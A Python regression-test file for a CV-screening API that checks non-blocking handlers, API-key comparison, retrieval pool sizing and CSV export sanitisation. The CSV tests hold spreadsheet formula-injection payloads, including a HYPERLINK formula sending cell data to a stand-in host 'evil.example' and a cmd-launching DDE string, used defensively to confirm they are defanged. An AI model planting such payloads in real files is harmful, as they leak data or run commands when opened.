"""Regression tests for defects found by stress-testing the running service.

Each of these was a real defect, found by measurement rather than by reading
code, and none was caught by the existing suite:

  * every handler was `async def` but did blocking work, so one slow request froze
    the whole server (measured: /health took 2.4s behind a 3s search, and six
    concurrent searches ran strictly one after another)
  * the candidate pool ignored top_k, so a request for 50 results returned at most
    the configured pool
  * the CSV export wrote raw cells, so an applicant-controlled name could run as a
    spreadsheet formula
  * the API key was compared with `!=`
"""

import asyncio
import csv
import io
import os
import shutil
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from fastapi.routing import APIRoute
from fastapi.testclient import TestClient
from qdrant_client import QdrantClient
from qdrant_client.http import models

import api.main as main_module
from api.main import app, csv_safe
from api.retriever import CVRetriever
from api.store import ScreeningStore

KEY = "hardening-test-key"


class HandlersDoNotBlockTheEventLoopTest(unittest.TestCase):
    def test_no_route_handler_is_a_coroutine_function(self):
        """`async def` runs on the event loop; the work inside (embedding, Qdrant,
        a reranker call that can take a minute under rate limits) is blocking, so
        one request stalled every other request, including /health. A plain `def`
        is run in FastAPI's threadpool instead.

        Structural rather than behavioural on purpose: TestClient gives each call
        its own event loop, so a behavioural test would pass against the bug. The
        behaviour was verified against a real uvicorn server (see the README).
        """
        offenders = [
            f"{route.methods} {route.path}"
            for route in app.routes
            if isinstance(route, APIRoute) and asyncio.iscoroutinefunction(route.endpoint)
        ]
        self.assertEqual(offenders, [])

    def test_every_expected_route_exists(self):
        """Guards the test above against passing because the loop saw no routes."""
        paths = {r.path for r in app.routes if isinstance(r, APIRoute)}
        for expected in ("/api/v1/screen", "/health", "/api/v1/candidates"):
            self.assertIn(expected, paths)


class CsvSafeTest(unittest.TestCase):
    def test_formula_prefixes_are_neutralised(self):
        for value in ("=SUM(A1)", "+1+1", "-2+3", "@cmd", "\t=x", "\r=x"):
            self.assertTrue(csv_safe(value).startswith("'"), repr(value))

    def test_harmless_values_are_untouched(self):
        for value in ("Ananya Rao", "O'Brien", "Strong match", "a=b", "x-y", "1.5", ""):
            self.assertEqual(csv_safe(value), value)

    def test_none_becomes_empty(self):
        self.assertEqual(csv_safe(None), "")

    def test_non_strings_are_stringified(self):
        self.assertEqual(csv_safe(42), "42")

    def test_a_classic_payload_is_defanged(self):
        payload = '=HYPERLINK("http://evil.example/?x="&A1,"click")'
        self.assertEqual(csv_safe(payload), "'" + payload)


class CsvExportIsSafeEndToEndTest(unittest.TestCase):
    """The real endpoint, with hostile values in the attacker-controlled columns."""

    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp(prefix="hardening_csv_"))
        cls.saved = {n: getattr(main_module, n) for n in ("store", "catalogue", "reranker", "retriever", "embedder")}
        cls.saved_key = os.environ.get("API_KEY")
        os.environ["API_KEY"] = KEY
        main_module.store = ScreeningStore(path=str(cls.tmp / "s.db"))
        main_module.catalogue = MagicMock()
        main_module.reranker = MagicMock()
        main_module.retriever = MagicMock()
        main_module.embedder = MagicMock()
        cls.client = TestClient(app)

    @classmethod
    def tearDownClass(cls):
        main_module.store.close()
        for name, value in cls.saved.items():
            setattr(main_module, name, value)
        if cls.saved_key is None:
            os.environ.pop("API_KEY", None)
        else:
            os.environ["API_KEY"] = cls.saved_key
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def test_hostile_name_note_and_reasoning_are_exported_as_text(self):
        job = "job-csv-injection"
        main_module.store.save_screening(
            job_id=job, job_description="jd", filters=None,
            candidates=[{
                "candidate_id": "cid-1",
                "name": '=HYPERLINK("http://evil.example","click")',
                "score": 0.9,
                "match_reasoning": "+cmd|' /C calc'!A0",
                "cv_path": "",
            }],
            timings={}, reranked=True,
        )
        main_module.store.set_decision(job, "cid-1", "shortlisted", "@SUM(1+1)")

        response = self.client.get(
            f"/api/v1/screenings/{job}/shortlist.csv", headers={"X-API-Key": KEY}
        )
        self.assertEqual(response.status_code, 200)
        rows = list(csv.reader(io.StringIO(response.text)))
        header, data = rows[0], rows[1]
        cell = dict(zip(header, data))

        for column in ("name", "note", "match_reasoning"):
            self.assertTrue(cell[column].startswith("'"), f"{column}: {cell[column]!r}")
        # The content itself is preserved, only defanged.
        self.assertIn("HYPERLINK", cell["name"])


class ApiKeyComparisonTest(unittest.TestCase):
    def setUp(self):
        self._saved_key = os.environ.get("API_KEY")
        os.environ["API_KEY"] = KEY
        self._saved = {n: getattr(main_module, n) for n in ("store", "catalogue")}
        main_module.store = MagicMock()
        main_module.catalogue = MagicMock()
        main_module.catalogue.stats.return_value = {
            "candidates": 0, "chunks": 0, "locations": {}, "experience_years": {}
        }
        self.client = TestClient(app)

    def tearDown(self):
        for name, value in self._saved.items():
            setattr(main_module, name, value)
        if self._saved_key is None:
            os.environ.pop("API_KEY", None)
        else:
            os.environ["API_KEY"] = self._saved_key

    def get(self, key):
        headers = {"X-API-Key": key} if key is not None else {}
        return self.client.get("/api/v1/candidates/stats", headers=headers).status_code

    def test_correct_key_is_accepted(self):
        self.assertNotEqual(self.get(KEY), 401)

    def test_wrong_missing_and_prefix_keys_are_rejected(self):
        self.assertEqual(self.get("wrong"), 401)
        self.assertEqual(self.get(None), 401)
        self.assertEqual(self.get(KEY[:-1]), 401)   # a correct prefix
        self.assertEqual(self.get(KEY + "x"), 401)  # correct key plus a suffix

    def test_a_non_ascii_key_is_rejected_not_a_server_error(self):
        """hmac.compare_digest raises TypeError on non-ASCII str. Encoding first
        means a hostile header gets a 401 rather than a 500."""
        # Sent as raw bytes: the test client refuses non-ASCII str headers, but an
        # attacker is not bound by it. Starlette decodes header bytes as latin-1,
        # so the server sees a str containing a non-ASCII character.
        self.assertEqual(self.get("clé-key".encode("latin-1")), 401)

    def test_comparison_uses_compare_digest(self):
        with patch("api.main.hmac.compare_digest", return_value=True) as compare:
            self.assertNotEqual(self.get("anything"), 401)
        compare.assert_called_once()


class CandidatePoolHonoursTopKTest(unittest.TestCase):
    """A request for more results than the configured pool must not be capped."""

    @classmethod
    def setUpClass(cls):
        cls.tmp = Path(tempfile.mkdtemp(prefix="hardening_pool_"))
        cls.client = QdrantClient(path=str(cls.tmp / "q"))
        cls.client.create_collection(
            "pool", vectors_config=models.VectorParams(size=4, distance=models.Distance.COSINE)
        )
        points = [
            models.PointStruct(
                id=i,
                vector=[1.0, 0.1 * i, 0.0, 0.0],
                payload={"candidate_id": f"c{i}", "name": f"Cand {i}", "cv_path": f"/{i}.pdf",
                         "chunk_text": f"text {i}", "years_of_experience": 3, "location": "Pune"},
            )
            for i in range(1, 13)
        ]
        cls.client.upsert("pool", points=points)

    @classmethod
    def tearDownClass(cls):
        try:
            cls.client.close()
        except Exception:
            pass
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def retriever(self, pool):
        with patch.dict(os.environ, {"RETRIEVAL_CANDIDATES": str(pool)}):
            r = CVRetriever(client=self.client)
        r.collection_name = "pool"
        r.hybrid_enabled = False
        return r

    def test_default_pool_is_the_evaluated_one(self):
        """10 is what every measurement used. The old default, 30, was never
        measured and made the cross-encoder worse and ~3x slower."""
        with patch.dict(os.environ, {}, clear=False):
            os.environ.pop("RETRIEVAL_CANDIDATES", None)
            os.environ.pop("RETRIEVAL_TOP_N", None)
            self.assertEqual(CVRetriever(client=MagicMock()).retrieval_candidates, 10)

    def test_a_non_evaluated_pool_is_warned_about(self):
        """The default moved from 30 to 10, but an existing .env copied from the old
        .env.example keeps pinning 30, so the fix silently did nothing for every
        current setup until this was noticed from a log line saying retrieved=30."""
        with patch.dict(os.environ, {"RETRIEVAL_CANDIDATES": "30"}):
            with self.assertLogs("api.retriever", level="WARNING") as logs:
                CVRetriever(client=MagicMock())
        self.assertTrue(any("30" in line and "evaluation" in line for line in logs.output))

    def test_the_evaluated_pool_is_not_warned_about(self):
        with patch.dict(os.environ, {"RETRIEVAL_CANDIDATES": "10"}):
            with self.assertNoLogs("api.retriever", level="WARNING"):
                CVRetriever(client=MagicMock())

    def test_the_configured_pool_applies_by_default(self):
        results = self.retriever(5).search_candidates([1.0, 0.0, 0.0, 0.0], filters=None)
        self.assertEqual(len(results), 5)

    def test_a_larger_request_enlarges_the_pool(self):
        results = self.retriever(5).search_candidates(
            [1.0, 0.0, 0.0, 0.0], filters=None, at_least=9
        )
        self.assertEqual(len(results), 9)

    def test_a_smaller_request_does_not_shrink_the_pool(self):
        """The pool is also what the reranker sees; top_k only trims the output."""
        results = self.retriever(8).search_candidates(
            [1.0, 0.0, 0.0, 0.0], filters=None, at_least=2
        )
        self.assertEqual(len(results), 8)

    def test_the_handler_passes_top_k_through(self):
        saved = {n: getattr(main_module, n) for n in ("embedder", "retriever", "reranker", "store", "jd_filter")}
        saved_key = os.environ.get("API_KEY")
        try:
            os.environ["API_KEY"] = KEY
            main_module.jd_filter = None
            main_module.embedder = MagicMock()
            main_module.embedder.embed_text.return_value = [0.1] * 384
            main_module.retriever = MagicMock()
            main_module.retriever.search_candidates.return_value = []
            main_module.reranker = MagicMock()
            main_module.store = MagicMock()
            TestClient(app).post(
                "/api/v1/screen",
                json={"job_description": "python backend", "top_k": 37},
                headers={"X-API-Key": KEY},
            )
            self.assertEqual(
                main_module.retriever.search_candidates.call_args.kwargs["at_least"], 37
            )
        finally:
            for name, value in saved.items():
                setattr(main_module, name, value)
            if saved_key is None:
                os.environ.pop("API_KEY", None)
            else:
                os.environ["API_KEY"] = saved_key


if __name__ == "__main__":
    unittest.main(verbosity=2)
